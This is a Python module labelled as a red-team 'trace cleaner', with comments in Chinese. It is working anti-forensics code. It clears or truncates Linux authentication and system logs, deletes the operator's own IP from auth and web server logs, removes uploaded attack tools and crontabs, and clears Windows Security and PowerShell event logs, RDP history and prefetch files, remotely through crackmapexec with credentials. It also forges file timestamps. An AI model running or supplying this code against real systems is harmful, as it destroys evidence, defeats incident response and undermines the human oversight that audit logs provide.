#!/usr/bin/env python3
"""
Trace Cleaner — 痕迹清理模块

红队行动结束后的痕迹清理：日志删除、文件清理、连接痕迹消除。

用法：
    from trace_cleaner import TraceCleaner
    tc = TraceCleaner(kb)
    tc.clean_linux()
    tc.clean_windows(target, user, password)
"""

from typing import Dict, List


class TraceCleaner:
    """痕迹清理器"""

    def __init__(self, kb=None):
        self.kb = kb

    def _run(self, cmd, timeout=30):
        if self.kb and self.kb.is_available():
            return self.kb.run(cmd, timeout=timeout)
        else:
            import subprocess
            try:
                r = subprocess.run(
                    cmd, shell=True, capture_output=True,
                    text=True, timeout=timeout
                )
                return {"success": r.returncode == 0,
                        "output": (r.stdout + r.stderr)[:5000]}
            except Exception as e:
                return {"success": False, "output": str(e)}


    # ═══════════════════════════════════════════════════════════
    # Linux 痕迹清理
    # ═══════════════════════════════════════════════════════════

    def clean_linux(self, level="standard") -> Dict:
        """Linux 痕迹清理"""
        results = []

        if level in ("standard", "full"):
            # 清除命令历史
            cmds = [
                "history -c",
                "cat /dev/null > ~/.bash_history",
                "cat /dev/null > /var/log/wtmp",
                "cat /dev/null > /var/log/btmp",
                "cat /dev/null > /var/log/lastlog",
                "cat /dev/null > /var/log/auth.log",
                "cat /dev/null > /var/log/secure",
                "cat /dev/null > /var/log/syslog",
                "cat /dev/null > /var/log/messages",
            ]
            for c in cmds:
                r = self._run(c, timeout=5)
                results.append({"cmd": c, "ok": r.get("success", False)})

        if level == "full":
            # 清除更多痕迹
            extra_cmds = [
                # 清除 SSH 登录记录
                "cat /dev/null > /var/log/auth.log",
                "sed -i '/YOUR_IP/d' /var/log/auth.log 2>/dev/null",
                # 清除 tmp 文件
                "rm -rf /tmp/.tunnels /tmp/.loot /tmp/.av_bypass 2>/dev/null",
                "rm -rf /tmp/fscan* /tmp/frp* /tmp/chisel* 2>/dev/null",
                # 清除计划任务痕迹
                "crontab -r 2>/dev/null",
                # 取消 history 记录
                "unset HISTFILE",
                "export HISTSIZE=0",
            ]
            for c in extra_cmds:
                r = self._run(c, timeout=5)
                results.append({"cmd": c, "ok": r.get("success", False)})

        return {"level": level, "actions": len(results), "results": results}

    def clean_linux_selective(self, ip_to_remove: str) -> Dict:
        """选择性清除（只删自己 IP 相关的记录）"""
        cmds = [
            f"sed -i '/{ip_to_remove}/d' /var/log/auth.log 2>/dev/null",
            f"sed -i '/{ip_to_remove}/d' /var/log/secure 2>/dev/null",
            f"sed -i '/{ip_to_remove}/d' /var/log/syslog 2>/dev/null",
            f"sed -i '/{ip_to_remove}/d' /var/log/messages 2>/dev/null",
            f"sed -i '/{ip_to_remove}/d' /var/log/nginx/access.log 2>/dev/null",
            f"sed -i '/{ip_to_remove}/d' /var/log/apache2/access.log 2>/dev/null",
        ]
        results = []
        for c in cmds:
            r = self._run(c, timeout=5)
            results.append({"cmd": c, "ok": r.get("success", False)})
        return {"ip_removed": ip_to_remove, "results": results}


    # ═══════════════════════════════════════════════════════════
    # Windows 痕迹清理
    # ═══════════════════════════════════════════════════════════

    def clean_windows(self, target: str = "", user: str = "",
                      password: str = "", level="standard") -> Dict:
        """Windows 痕迹清理"""
        prefix = ""
        if target and user:
            prefix = f"crackmapexec smb {target} -u '{user}' -p '{password}' -x "

        results = []

        if level in ("standard", "full"):
            cmds = [
                # 清除事件日志
                'wevtutil cl Security',
                'wevtutil cl System',
                'wevtutil cl Application',
                'wevtutil cl "Windows PowerShell"',
                # 清除 RDP 连接记录
                'reg delete "HKCU\\Software\\Microsoft\\Terminal Server Client\\Default" /f',
                # 清除 Recent
                'del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\*',
                # 清除 Prefetch
                'del /f /q C:\\Windows\\Prefetch\\*',
                # 清除 temp
                'del /f /q %TEMP%\\* 2>nul',
            ]
            for c in cmds:
                if prefix:
                    r = self._run(f"{prefix}'{c}' 2>/dev/null", timeout=15)
                else:
                    r = self._run(c, timeout=15)
                results.append({"cmd": c, "ok": r.get("success", False)})

        if level == "full":
            extra = [
                # PowerShell 日志
                'Remove-Item (Get-PSReadlineOption).HistorySavePath -Force',
                # 防火墙规则恢复
                'netsh advfirewall reset',
                # 删除工具文件
                'del /f /q C:\\temp\\*.exe C:\\temp\\*.ps1 2>nul',
            ]
            for c in extra:
                if prefix:
                    r = self._run(f"{prefix}'{c}' 2>/dev/null", timeout=15)
                else:
                    r = self._run(c, timeout=15)
                results.append({"cmd": c, "ok": r.get("success", False)})

        return {"level": level, "actions": len(results), "results": results}

    # ═══════════════════════════════════════════════════════════
    # 工具文件清理
    # ═══════════════════════════════════════════════════════════

    def clean_tools(self) -> Dict:
        """清理上传到目标的工具文件"""
        linux_cmds = [
            "rm -rf /tmp/.tunnels /tmp/.loot /tmp/.av_bypass",
            "rm -f /tmp/fscan* /tmp/frp* /tmp/chisel* /tmp/nc*",
            "rm -f /tmp/*.bin /tmp/*.elf /tmp/payload*",
            "rm -f /var/tmp/*.sh /var/tmp/*.py",
        ]
        win_cmds = [
            "del /f /q C:\\temp\\*.exe",
            "del /f /q C:\\temp\\*.ps1",
            "del /f /q C:\\temp\\*.bat",
            "rd /s /q C:\\temp\\loot",
        ]

        results = []
        for c in linux_cmds:
            r = self._run(c, timeout=5)
            results.append({"cmd": c, "ok": r.get("success", False)})

        return {"cleaned": len(results), "results": results}

    # ═══════════════════════════════════════════════════════════
    # 时间戳伪造
    # ═══════════════════════════════════════════════════════════

    def timestomp(self, file_path: str, reference_file="/etc/passwd") -> Dict:
        """修改文件时间戳（Linux touch -r）"""
        cmd = f"touch -r {reference_file} {file_path} 2>/dev/null"
        r = self._run(cmd)
        return {"success": r.get("success", False), "file": file_path,
                "reference": reference_file}

    def timestomp_windows(self, file_path: str, target: str = "",
                          user: str = "", password: str = "") -> Dict:
        """Windows 时间戳伪造"""
        ps_cmd = f"""
$f = Get-Item '{file_path}';
$f.CreationTime = '01/01/2023 08:00:00';
$f.LastWriteTime = '01/01/2023 08:00:00';
$f.LastAccessTime = '01/01/2023 08:00:00'
"""
        if target and user:
            cmd = f"crackmapexec smb {target} -u '{user}' -p '{password}' -x \"powershell -c \\\"{ps_cmd}\\\"\" 2>/dev/null"
        else:
            cmd = f"powershell -c \"{ps_cmd}\""
        r = self._run(cmd, timeout=15)
        return {"success": r.get("success", False), "output": r.get("output", "")}
